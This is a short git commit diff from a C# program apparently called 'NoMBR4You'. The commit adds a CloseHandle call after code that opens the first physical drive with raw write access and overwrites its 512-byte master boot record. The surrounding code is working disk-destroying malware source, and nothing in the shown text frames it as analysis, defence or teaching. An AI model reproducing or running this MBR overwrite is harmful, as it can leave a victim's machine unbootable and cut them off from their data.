64f820a1aaef2f452e2f2b37d61f7291f8abeb00
noob <68382500+n00bes@users.noreply.github.com>
2021-05-22 20:20:27 +0300

    distroy handle
    Terminate the handle so other programs can use the disk.

--- Program.cs
+++ Program.cs
@@ -20,11 +20,16 @@ namespace NoMBR4You
             var mbr = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x1 | (uint)0x2, IntPtr.Zero, 0x3, 0, IntPtr.Zero);
 
             WriteFile(mbr, mbrData, 512, out uint lpNumberOfBytesWritten, IntPtr.Zero);
+            
+            CloseHandle(mbr); //nice and clean
         }
         [DllImport("kernel32")]
         private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
 
         [DllImport("kernel32")]
         private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
+       
+        [DllImport("kernel32", CharSet = CharSet.Auto,SetLastError = true)]
+        static extern bool CloseHandle(IntPtr handle);//link winapi function from kernel32.dll
     }
 }
